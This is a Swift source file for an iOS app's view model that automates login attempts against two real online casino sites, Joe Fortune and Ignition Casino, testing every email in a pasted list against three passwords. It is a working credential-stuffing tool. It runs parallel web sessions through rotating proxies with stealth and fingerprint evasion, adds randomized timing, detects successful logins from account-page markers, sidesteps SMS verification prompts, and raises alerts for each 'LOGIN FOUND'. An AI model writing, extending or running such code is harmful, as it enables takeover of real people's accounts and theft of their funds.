import Foundation
import Observation
import SwiftUI
import UserNotifications

@Observable
@MainActor
class DualFindViewModel {
    var emails: [String] = []
    var passwords: [String] = ["", "", ""]
    var sessionCount: DualFindSessionCount = .six
    var emailInputText: String = ""

    var isRunning: Bool = false
    var isPaused: Bool = false
    var isStopping: Bool = false

    var currentEmailIndex: Int = 0
    var currentPasswordIndex: Int = 0
    var totalEmails: Int = 0
    var completedTests: Int = 0

    var sessions: [DualFindSessionInfo] = []
    var logs: [PPSRLogEntry] = []
    var hits: [DualFindHit] = []
    var disabledEmails: Set<String> = []

    var showLoginFound: Bool = false
    var latestHit: DualFindHit?
    var hasResumePoint: Bool = false

    var appearanceMode: AppAppearanceMode = .dark
    var stealthEnabled: Bool = true
    var debugMode: Bool = false
    var testTimeout: TimeInterval = 90
    var maxConcurrency: Int = 8
    var automationSettings: AutomationSettings = AutomationSettings()

    private var resumePoint: DualFindResumePoint?
    private var runTask: Task<Void, Never>?
    private let persistKey = "dual_find_resume_v1"

    private var joePersistentSessions: [LoginSiteWebSession] = []
    private var ignPersistentSessions: [LoginSiteWebSession] = []
    private var joeCalibrations: [LoginCalibrationService.URLCalibration?] = []
    private var ignCalibrations: [LoginCalibrationService.URLCalibration?] = []

    private var joeNextEmailIdx: Int = 0
    private var ignNextEmailIdx: Int = 0

    let urlRotation = LoginURLRotationService.shared
    let proxyService = ProxyRotationService.shared
    private let notifications = PPSRNotificationService.shared
    private let logger = DebugLogger.shared
    private let backgroundService = BackgroundTaskService.shared
    private let networkFactory = NetworkSessionFactory.shared
    private let blacklistService = BlacklistService.shared
    private let calibrationService = LoginCalibrationService.shared

    var progressText: String {
        guard totalEmails > 0 else { return "Ready" }
        let totalCombos = totalEmails * 3 * 2
        return "\(completedTests)/\(totalCombos) tested — Password \(currentPasswordIndex + 1)/3"
    }

    var progressFraction: Double {
        guard totalEmails > 0 else { return 0 }
        let totalCombos = totalEmails * 3 * 2
        guard totalCombos > 0 else { return 0 }
        return Double(completedTests) / Double(totalCombos)
    }

    var parsedEmailCount: Int {
        parseEmails(from: emailInputText).count
    }

    var canStart: Bool {
        parsedEmailCount > 0 && passwords.filter({ !$0.trimmingCharacters(in: .whitespaces).isEmpty }).count == 3
    }

    init() {
        notifications.requestPermission()
        loadResumePoint()
        loadSettings()
        loadAppSettings()
    }

    func parseEmails(from text: String) -> [String] {
        text.components(separatedBy: .newlines)
            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            .filter { !$0.isEmpty && $0.contains("@") }
    }

    func startRun() {
        let parsed = parseEmails(from: emailInputText)
        guard !parsed.isEmpty else { return }
        let validPasswords = passwords.map { $0.trimmingCharacters(in: .whitespaces) }
        guard validPasswords.allSatisfy({ !$0.isEmpty }) else { return }

        reloadAllSettings()

        emails = parsed
        totalEmails = parsed.count
        currentEmailIndex = 0
        currentPasswordIndex = 0
        completedTests = 0
        disabledEmails.removeAll()
        hits.removeAll()
        logs.removeAll()
        sessions.removeAll()
        isPaused = false
        isStopping = false

        buildSessionInfoDisplay()

        logSettingsSummary()
        log("Starting Dual Find: \(totalEmails) emails × 3 passwords × 2 sites = \(totalEmails * 3 * 2) combinations")
        log("Session mode: \(sessionCount.label) — persistent sessions, field-clear pattern")

        isRunning = true
        DeviceProxyService.shared.notifyBatchStart()
        backgroundService.beginExtendedBackgroundExecution(reason: "Dual Find Account scan")

        runTask = Task {
            await executeRun(emails: emails, passwords: validPasswords)
        }
    }

    func resumeRun() {
        guard let rp = resumePoint else { return }

        reloadAllSettings()

        emails = rp.emails
        totalEmails = rp.emails.count
        currentEmailIndex = rp.emailIndex
        currentPasswordIndex = rp.passwordIndex
        disabledEmails = Set(rp.disabledEmails)
        hits = rp.foundLogins
        sessionCount = DualFindSessionCount(rawValue: rp.sessionCount) ?? .six
        completedTests = 0
        logs.removeAll()
        sessions.removeAll()
        isPaused = false
        isStopping = false

        if rp.passwords.count == 3 {
            passwords = rp.passwords
        }

        buildSessionInfoDisplay()

        logSettingsSummary()
        log("Resuming Dual Find from Email \(currentEmailIndex + 1)/\(totalEmails), Password \(currentPasswordIndex + 1)/3")

        isRunning = true
        DeviceProxyService.shared.notifyBatchStart()
        backgroundService.beginExtendedBackgroundExecution(reason: "Dual Find Account resume")

        runTask = Task {
            await executeRun(emails: emails, passwords: passwords)
        }
    }

    func pauseRun() {
        isPaused = true
        log("Paused — all sessions frozen", level: .warning)
    }

    func resumeFromPause() {
        isPaused = false
        log("Resumed")
    }

    func stopRun() {
        isStopping = true
        isPaused = false
        log("Stopping — finishing current tests...", level: .warning)
    }

    func clearResumePoint() {
        resumePoint = nil
        hasResumePoint = false
        UserDefaults.standard.removeObject(forKey: persistKey)
    }

    // MARK: - Core Run Loop (Persistent Sessions, Independent Platform Loops)

    private func executeRun(emails: [String], passwords: [String]) async {
        await withTaskGroup(of: Void.self) { group in
            group.addTask {
                await self.platformLoop(site: .joefortune, emails: emails, passwords: passwords)
            }
            group.addTask {
                await self.platformLoop(site: .ignition, emails: emails, passwords: passwords)
            }
            await group.waitForAll()
        }

        teardownAllPersistentSessions()
        finalizeRun()
    }

    private func platformLoop(site: LoginTargetSite, emails: [String], passwords: [String]) async {
        let perSite = sessionCount.perSite
        let siteLabel = site == .joefortune ? "JOE" : "IGN"
        let platformName = site == .joefortune ? "Joe Fortune" : "Ignition Casino"

        log("[\(siteLabel)] Starting platform loop: \(perSite) persistent sessions")

        var webSessions: [LoginSiteWebSession] = []
        var calibrations: [LoginCalibrationService.URLCalibration?] = []

        for i in 0..<perSite {
            guard !isStopping else { return }
            let label = "\(siteLabel)-\(i + 1)"

            let session = createPersistentWebSession(site: site, sessionIndex: i)
            webSessions.append(session)
            calibrations.append(nil)

            let loaded = await navigateAndSetupSession(session: session, site: site, label: label)
            if !loaded {
                log("[\(label)] Failed to load login page — will retry on first use", level: .error)
            }

            let cal = await calibrateSession(session: session, site: site, label: label)
            calibrations[i] = cal

            updateSession(id: "\(platformName)_\(i)", email: "", status: "Ready", active: false)
        }

        if site == .joefortune {
            joePersistentSessions = webSessions
            joeCalibrations = calibrations
        } else {
            ignPersistentSessions = webSessions
            ignCalibrations = calibrations
        }

        for pwIdx in currentPasswordIndex..<3 {
            guard !isStopping else { break }
            let password = passwords[pwIdx]
            log("[\(siteLabel)] === Password Round \(pwIdx + 1)/3 ===")

            for i in 0..<webSessions.count {
                guard !isStopping else { break }
                let label = "\(siteLabel)-\(i + 1)"
                let session = webSessions[i]

                if pwIdx > 0 {
                    await session.clearPasswordFieldOnly()
                    try? await Task.sleep(for: .milliseconds(200))
                    log("[\(label)] Cleared password field for pw \(pwIdx + 1)")
                }

                let cal = calibrations[i]
                let fillResult = await session.fillPasswordCalibrated(password, calibration: cal)
                if !fillResult.success {
                    let tdResult = await session.trueDetectionFillPassword(password)
                    if !tdResult.success {
                        log("[\(label)] Password fill failed — trying legacy", level: .warning)
                        _ = await session.fillPassword(password)
                    }
                }
                log("[\(label)] Password \(pwIdx + 1) entered")
                updateSession(id: "\(platformName)_\(i)", email: "", status: "PW\(pwIdx + 1) Ready", active: true)
            }

            let emailStartIdx: Int
            if pwIdx == resumePoint?.passwordIndex, let rpIdx = resumePoint?.emailIndex {
                emailStartIdx = rpIdx
            } else {
                emailStartIdx = 0
            }

            if site == .joefortune {
                joeNextEmailIdx = emailStartIdx
            } else {
                ignNextEmailIdx = emailStartIdx
            }

            await withTaskGroup(of: Void.self) { group in
                for i in 0..<webSessions.count {
                    let sessionIdx = i
                    group.addTask {
                        await self.sessionEmailLoop(
                            sessionIndex: sessionIdx,
                            site: site,
                            emails: emails,
                            password: password,
                            passwordIndex: pwIdx
                        )
                    }
                }
                await group.waitForAll()
            }

            if site == .joefortune {
                currentPasswordIndex = pwIdx
            }

            log("[\(siteLabel)] Password \(pwIdx + 1)/3 complete", level: .success)
        }

        log("[\(siteLabel)] Platform loop complete — all 3 passwords tested", level: .success)
    }

    // MARK: - Per-Session Email Processing Loop

    private func sessionEmailLoop(sessionIndex: Int, site: LoginTargetSite, emails: [String], password: String, passwordIndex: Int) async {
        let siteLabel = site == .joefortune ? "JOE" : "IGN"
        let platformName = site == .joefortune ? "Joe Fortune" : "Ignition Casino"
        let label = "\(siteLabel)-\(sessionIndex + 1)"
        let sessionInfoId = "\(platformName)_\(sessionIndex)"

        while true {
            guard !isStopping else { break }

            while isPaused && !isStopping {
                try? await Task.sleep(for: .milliseconds(500))
            }
            guard !isStopping else { break }

            guard let emailIdx = grabNextEmail(for: site) else { break }
            let email = emails[emailIdx]

            currentEmailIndex = max(currentEmailIndex, emailIdx)

            if disabledEmails.contains(email.lowercased()) {
                log("[\(label)] Skipping disabled: \(email)")
                completedTests += 1
                continue
            }

            updateSession(id: sessionInfoId, email: email, status: "Testing", active: true)

            guard let session = getPersistentSession(site: site, index: sessionIndex) else {
                log("[\(label)] No session available — skipping", level: .error)
                completedTests += 1
                continue
            }

            let fieldsCheck = await session.verifyLoginFieldsExist()
            if fieldsCheck.found < 2 {
                log("[\(label)] Form fields missing — reloading page", level: .warning)
                let reloaded = await navigateAndSetupSession(session: session, site: site, label: label)
                if reloaded {
                    let cal = await calibrateSession(session: session, site: site, label: label)
                    setCalibration(site: site, index: sessionIndex, calibration: cal)
                    _ = await session.fillPasswordCalibrated(password, calibration: cal)
                } else {
                    log("[\(label)] Page reload failed — burning session", level: .error)
                    await burnAndReplaceSession(site: site, index: sessionIndex, password: password, label: label)
                }
            }

            await session.clearEmailFieldOnly()
            try? await Task.sleep(for: .milliseconds(100))

            let cal = getCalibration(site: site, index: sessionIndex)
            let emailFillResult = await session.fillUsernameCalibrated(email, calibration: cal)
            if !emailFillResult.success {
                let tdResult = await session.trueDetectionFillEmail(email)
                if !tdResult.success {
                    log("[\(label)] Email fill failed for \(email) — trying legacy", level: .warning)
                    _ = await session.fillUsername(email)
                }
            }

            try? await Task.sleep(for: .milliseconds(Int.random(in: 100...300)))

            let calForBtn = getCalibration(site: site, index: sessionIndex)
            let submitResult = await session.clickLoginButtonCalibrated(calibration: calForBtn)
            if !submitResult.success {
                let tdSubmit = await session.trueDetectionTripleClickSubmit()
                if !tdSubmit.success {
                    _ = await session.pressEnterOnPasswordField()
                }
            }

            try? await Task.sleep(for: .seconds(6))

            let outcome = await evaluateResponseWithTimeout(session: session, timeout: 10)

            switch outcome {
            case .success:
                let hit = DualFindHit(email: email, password: password, platform: site.rawValue)
                hits.append(hit)
                latestHit = hit
                showLoginFound = true
                log("🎯 LOGIN FOUND: \(email) on \(site.rawValue)", level: .success)
                sendLoginFoundNotification(email: email, platform: site.rawValue)
                updateSession(id: sessionInfoId, email: email, status: "HIT!", active: false)

                saveResumePoint()
                isPaused = true
                while isPaused && !isStopping {
                    try? await Task.sleep(for: .milliseconds(500))
                }
                if isStopping { break }
                showLoginFound = false

                let reloaded = await navigateAndSetupSession(session: session, site: site, label: label)
                if reloaded {
                    let newCal = await calibrateSession(session: session, site: site, label: label)
                    setCalibration(site: site, index: sessionIndex, calibration: newCal)
                    _ = await session.fillPasswordCalibrated(password, calibration: newCal)
                }

            case .disabled:
                disabledEmails.insert(email.lowercased())
                log("[\(label)] \(email) — DISABLED (eliminated from all testing)", level: .error)
                updateSession(id: sessionInfoId, email: email, status: "Disabled", active: false)

                let checkFields = await session.verifyLoginFieldsExist()
                if checkFields.found < 2 {
                    let reloaded = await navigateAndSetupSession(session: session, site: site, label: label)
                    if reloaded {
                        let newCal = await calibrateSession(session: session, site: site, label: label)
                        setCalibration(site: site, index: sessionIndex, calibration: newCal)
                        _ = await session.fillPasswordCalibrated(password, calibration: newCal)
                    }
                }

            case .transient:
                log("[\(label)] \(email) — transient error, burning session & retrying", level: .warning)
                updateSession(id: sessionInfoId, email: email, status: "Rebuilding", active: true)

                await burnAndReplaceSession(site: site, index: sessionIndex, password: password, label: label)

                guard let freshSession = getPersistentSession(site: site, index: sessionIndex) else {
                    log("[\(label)] Replacement session unavailable", level: .error)
                    completedTests += 1
                    continue
                }

                let retryOutcome = await retryEmailOnFreshSession(
                    session: freshSession, email: email, password: password,
                    site: site, sessionIndex: sessionIndex, label: label
                )

                switch retryOutcome {
                case .success:
                    let hit = DualFindHit(email: email, password: password, platform: site.rawValue)
                    hits.append(hit)
                    latestHit = hit
                    showLoginFound = true
                    log("🎯 LOGIN FOUND (retry): \(email) on \(site.rawValue)", level: .success)
                    sendLoginFoundNotification(email: email, platform: site.rawValue)
                    updateSession(id: sessionInfoId, email: email, status: "HIT!", active: false)

                    saveResumePoint()
                    isPaused = true
                    while isPaused && !isStopping {
                        try? await Task.sleep(for: .milliseconds(500))
                    }
                    if isStopping { break }
                    showLoginFound = false

                case .disabled:
                    disabledEmails.insert(email.lowercased())
                    log("[\(label)] retry: \(email) — DISABLED (eliminated)", level: .error)
                    updateSession(id: sessionInfoId, email: email, status: "Disabled", active: false)

                default:
                    log("[\(label)] retry: \(email) — \(retryOutcome) (moving on)", level: .warning)
                    updateSession(id: sessionInfoId, email: email, status: "Done", active: false)
                }

            case .noAccount:
                log("[\(label)] \(email) — no account (pw \(passwordIndex + 1))")
                updateSession(id: sessionInfoId, email: email, status: "No Acc", active: false)
            }

            completedTests += 1
        }
    }

    // MARK: - Response Evaluation

    private func evaluateResponseWithTimeout(session: LoginSiteWebSession, timeout: TimeInterval) async -> DualFindTestOutcome {
        let timeout = TimeoutResolver.resolveAutomationTimeout(timeout)
        let result: DualFindTestOutcome = await withTaskGroup(of: DualFindTestOutcome.self) { group in
            group.addTask {
                return await self.evaluateResponse(session: session)
            }
            group.addTask {
                try? await Task.sleep(for: .seconds(timeout))
                return .transient
            }
            let first = await group.next() ?? .transient
            group.cancelAll()
            return first
        }
        return result
    }

    private func evaluateResponse(session: LoginSiteWebSession) async -> DualFindTestOutcome {
        let pageContent = await session.getPageContent()
        let contentLower = pageContent.lowercased()
        let currentURL = await session.getCurrentURL()
        let urlLower = currentURL.lowercased()

        let successMarkers = ["balance", "wallet", "my account", "logout", "dashboard", "deposit"]
        for marker in successMarkers {
            if contentLower.contains(marker) && !urlLower.contains("/login") && !urlLower.contains("/signin") {
                return .success
            }
        }

        if !urlLower.contains("/login") && !urlLower.contains("/signin") && !urlLower.contains("error") {
            for marker in ["balance", "wallet", "my account", "logout"] {
                if contentLower.contains(marker) {
                    return .success
                }
            }
            let tdValidation = await session.trueDetectionValidateSuccess()
            if tdValidation.success {
                return .success
            }
        }

        if contentLower.contains("disabled") || contentLower.contains("account is disabled") || contentLower.contains("temporarily disabled") {
            return .disabled
        }

        if contentLower.contains("error") && !contentLower.contains("incorrect") && !contentLower.contains("invalid") && !contentLower.contains("wrong") {
            return .transient
        }

        let isIgnition = urlLower.contains("ignition")
        if isIgnition {
            let smsKeywords = ["sms", "text message", "verification code", "verify your phone",
                               "send code", "sent a code", "enter the code", "phone verification",
                               "mobile verification", "confirm your number", "code sent",
                               "enter code", "security code sent", "check your phone"]
            for keyword in smsKeywords {
                if contentLower.contains(keyword) {
                    return .transient
                }
            }
        }
        if contentLower.contains("sms") {
            return .transient
        }

        if pageContent.trimmingCharacters(in: .whitespacesAndNewlines).count < 30 {
            return .transient
        }

        return .noAccount
    }

    // MARK: - Retry on Fresh Session

    private func retryEmailOnFreshSession(session: LoginSiteWebSession, email: String, password: String, site: LoginTargetSite, sessionIndex: Int, label: String) async -> DualFindTestOutcome {
        await session.clearEmailFieldOnly()
        try? await Task.sleep(for: .milliseconds(100))

        let cal = getCalibration(site: site, index: sessionIndex)
        let fillResult = await session.fillUsernameCalibrated(email, calibration: cal)
        if !fillResult.success {
            let tdResult = await session.trueDetectionFillEmail(email)
            if !tdResult.success {
                _ = await session.fillUsername(email)
            }
        }

        try? await Task.sleep(for: .milliseconds(Int.random(in: 100...300)))

        let submitResult = await session.clickLoginButtonCalibrated(calibration: cal)
        if !submitResult.success {
            let tdSubmit = await session.trueDetectionTripleClickSubmit()
            if !tdSubmit.success {
                _ = await session.pressEnterOnPasswordField()
            }
        }

        try? await Task.sleep(for: .seconds(6))

        return await evaluateResponseWithTimeout(session: session, timeout: 10)
    }

    // MARK: - Persistent Session Management

    private func createPersistentWebSession(site: LoginTargetSite, sessionIndex: Int) -> LoginSiteWebSession {
        let proxyTarget: ProxyRotationService.ProxyTarget = site == .joefortune ? .joe : .ignition
        let netConfig = networkFactory.appWideConfig(for: proxyTarget)

        urlRotation.isIgnitionMode = (site == .ignition)
        let targetURL = urlRotation.nextURL() ?? site.url

        let session = LoginSiteWebSession(targetURL: targetURL, networkConfig: netConfig)
        session.stealthEnabled = stealthEnabled
        session.fingerprintValidationEnabled = automationSettings.fingerprintValidationEnabled
        session.setUp(wipeAll: true)

        return session
    }

    private func navigateAndSetupSession(session: LoginSiteWebSession, site: LoginTargetSite, label: String) async -> Bool {
        for attempt in 1...3 {
            let loaded = await session.loadPage(timeout: automationSettings.pageLoadTimeout)
            if loaded {
                await session.dismissCookieNotices()
                try? await Task.sleep(for: .milliseconds(300))
                return true
            }
            log("[\(label)] Page load attempt \(attempt)/3 failed: \(session.lastNavigationError ?? "unknown")", level: .warning)
            if attempt < 3 {
                try? await Task.sleep(for: .seconds(Double(attempt) * 2))
                if attempt == 2 {
                    session.tearDown(wipeAll: true)
                    session.setUp(wipeAll: true)
                }
            }
        }
        return false
    }

    private func calibrateSession(session: LoginSiteWebSession, site: LoginTargetSite, label: String) async -> LoginCalibrationService.URLCalibration? {
        let urlString = session.targetURL.absoluteString
        if let existing = calibrationService.calibrationFor(url: urlString), existing.isCalibrated {
            log("[\(label)] Using saved calibration")
            return existing
        }
        if let cal = await session.autoCalibrate() {
            calibrationService.saveCalibration(cal, forURL: urlString)
            log("[\(label)] Auto-calibrated: email=\(cal.emailField?.cssSelector ?? "nil") pass=\(cal.passwordField?.cssSelector ?? "nil") btn=\(cal.loginButton?.cssSelector ?? "nil")")
            return cal
        }
        log("[\(label)] Calibration failed — using generic selectors", level: .warning)
        return nil
    }

    private func burnAndReplaceSession(site: LoginTargetSite, index: Int, password: String, label: String) async {
        log("[\(label)] Burning session and creating replacement", level: .warning)

        let oldSession = getPersistentSession(site: site, index: index)
        oldSession?.tearDown(wipeAll: true)

        let newSession = createPersistentWebSession(site: site, sessionIndex: index)
        setPersistentSession(site: site, index: index, session: newSession)

        let loaded = await navigateAndSetupSession(session: newSession, site: site, label: label)
        guard loaded else {
            log("[\(label)] Replacement session failed to load", level: .error)
            return
        }

        let cal = await calibrateSession(session: newSession, site: site, label: label)
        setCalibration(site: site, index: index, calibration: cal)

        let fillResult = await newSession.fillPasswordCalibrated(password, calibration: cal)
        if !fillResult.success {
            _ = await newSession.trueDetectionFillPassword(password)
        }
        log("[\(label)] Replacement session ready")
    }

    private func getPersistentSession(site: LoginTargetSite, index: Int) -> LoginSiteWebSession? {
        let sessions = site == .joefortune ? joePersistentSessions : ignPersistentSessions
        guard index < sessions.count else { return nil }
        return sessions[index]
    }

    private func setPersistentSession(site: LoginTargetSite, index: Int, session: LoginSiteWebSession) {
        if site == .joefortune {
            guard index < joePersistentSessions.count else { return }
            joePersistentSessions[index] = session
        } else {
            guard index < ignPersistentSessions.count else { return }
            ignPersistentSessions[index] = session
        }
    }

    private func getCalibration(site: LoginTargetSite, index: Int) -> LoginCalibrationService.URLCalibration? {
        let cals = site == .joefortune ? joeCalibrations : ignCalibrations
        guard index < cals.count else { return nil }
        return cals[index]
    }

    private func setCalibration(site: LoginTargetSite, index: Int, calibration: LoginCalibrationService.URLCalibration?) {
        if site == .joefortune {
            guard index < joeCalibrations.count else { return }
            joeCalibrations[index] = calibration
        } else {
            guard index < ignCalibrations.count else { return }
            ignCalibrations[index] = calibration
        }
    }

    private func grabNextEmail(for site: LoginTargetSite) -> Int? {
        if site == .joefortune {
            let idx = joeNextEmailIdx
            guard idx < emails.count else { return nil }
            joeNextEmailIdx += 1
            return idx
        } else {
            let idx = ignNextEmailIdx
            guard idx < emails.count else { return nil }
            ignNextEmailIdx += 1
            return idx
        }
    }

    private func teardownAllPersistentSessions() {
        for session in joePersistentSessions {
            session.tearDown(wipeAll: true)
        }
        for session in ignPersistentSessions {
            session.tearDown(wipeAll: true)
        }
        joePersistentSessions.removeAll()
        ignPersistentSessions.removeAll()
        joeCalibrations.removeAll()
        ignCalibrations.removeAll()
    }

    // MARK: - Session Display Info

    private func buildSessionInfoDisplay() {
        sessions.removeAll()
        let perSite = sessionCount.perSite
        for i in 0..<perSite {
            sessions.append(DualFindSessionInfo(index: i, platform: "Joe Fortune"))
        }
        for i in 0..<perSite {
            sessions.append(DualFindSessionInfo(index: i, platform: "Ignition Casino"))
        }
    }

    private func updateSession(id: String, email: String, status: String, active: Bool) {
        if let idx = sessions.firstIndex(where: { $0.id == id }) {
            sessions[idx].currentEmail = email
            sessions[idx].status = status
            sessions[idx].isActive = active
        }
    }

    // MARK: - Finalize

    private func finalizeRun() {
        isRunning = false
        isPaused = false
        let stoppedEarly = isStopping
        isStopping = false
        backgroundService.endExtendedBackgroundExecution()

        let totalPossible = totalEmails * 3 * 2

        if stoppedEarly {
            log("Run stopped: \(hits.count) hits, \(disabledEmails.count) disabled, tested \(completedTests)/\(totalPossible)", level: .warning)
            saveResumePoint()
        } else {
            log("Run complete: \(hits.count) hits found, \(disabledEmails.count) disabled, \(totalPossible) combinations tested", level: .success)
            clearResumePoint()
        }

        notifications.sendBatchComplete(working: hits.count, dead: disabledEmails.count, requeued: 0)
    }

    // MARK: - Persistence

    private func saveResumePoint() {
        let rp = DualFindResumePoint(
            emailIndex: currentEmailIndex,
            passwordIndex: currentPasswordIndex,
            emails: emails,
            passwords: passwords,
            sessionCount: sessionCount.rawValue,
            timestamp: Date(),
            disabledEmails: Array(disabledEmails),
            foundLogins: hits
        )
        if let data = try? JSONEncoder().encode(rp) {
            UserDefaults.standard.set(data, forKey: persistKey)
        }
        resumePoint = rp
        hasResumePoint = true
    }

    private func loadResumePoint() {
        guard let data = UserDefaults.standard.data(forKey: persistKey),
              let rp = try? JSONDecoder().decode(DualFindResumePoint.self, from: data) else {
            hasResumePoint = false
            return
        }
        resumePoint = rp
        hasResumePoint = true
        emailInputText = rp.emails.joined(separator: "\n")
        if rp.passwords.count == 3 {
            passwords = rp.passwords
        }
        sessionCount = DualFindSessionCount(rawValue: rp.sessionCount) ?? .six
    }

    private func loadSettings() {
        if let data = UserDefaults.standard.data(forKey: "automation_settings_v1"),
           let loaded = try? JSONDecoder().decode(AutomationSettings.self, from: data) {
            automationSettings = loaded.normalizedTimeouts()
        }
        maxConcurrency = automationSettings.maxConcurrency
    }

    private func loadAppSettings() {
        let persistence = LoginPersistenceService.shared
        if let settings = persistence.loadSettings() {
            debugMode = settings.debugMode
            stealthEnabled = settings.stealthEnabled
            testTimeout = max(settings.testTimeout, AutomationSettings.minimumTimeoutSeconds)
            if let mode = AppAppearanceMode(rawValue: settings.appearanceMode) {
                appearanceMode = mode
            }
        }
    }

    private func reloadAllSettings() {
        loadSettings()
        loadAppSettings()
    }

    private func logSettingsSummary() {
        let joeMode = proxyService.connectionMode(for: .joe)
        let ignMode = proxyService.connectionMode(for: .ignition)
        let deviceWide = DeviceProxyService.shared.isEnabled
        log("Settings: timeout=\(Int(testTimeout))s stealth=\(stealthEnabled) debug=\(debugMode)")
        log("Network: Joe=\(joeMode.label) Ignition=\(ignMode.label) DeviceWide=\(deviceWide)")
        log("Automation: pageLoad=\(Int(automationSettings.pageLoadTimeout))s fpValidation=\(automationSettings.fingerprintValidationEnabled)")
        log("Pattern: persistent sessions, email-clear-only per test, password-clear only on pw advance (2× per platform)")
    }

    // MARK: - Notifications

    private func sendLoginFoundNotification(email: String, platform: String) {
        let content = UNMutableNotificationContent()
        content.title = "LOGIN FOUND"
        content.body = "\(email) on \(platform)"
        content.sound = .defaultCritical
        let request = UNNotificationRequest(identifier: UUID().uuidString, content: content, trigger: nil)
        UNUserNotificationCenter.current().add(request)
    }

    // MARK: - Logging

    func log(_ message: String, level: PPSRLogEntry.Level = .info) {
        let entry = PPSRLogEntry(message: message, level: level)
        logs.insert(entry, at: 0)
        if logs.count > 2000 {
            logs.removeLast(logs.count - 2000)
        }
        let debugLevel: DebugLogLevel
        switch level {
        case .info: debugLevel = .info
        case .success: debugLevel = .success
        case .warning: debugLevel = .warning
        case .error: debugLevel = .error
        }
        logger.log("[DualFind] \(message)", category: .login, level: debugLevel)
    }
}
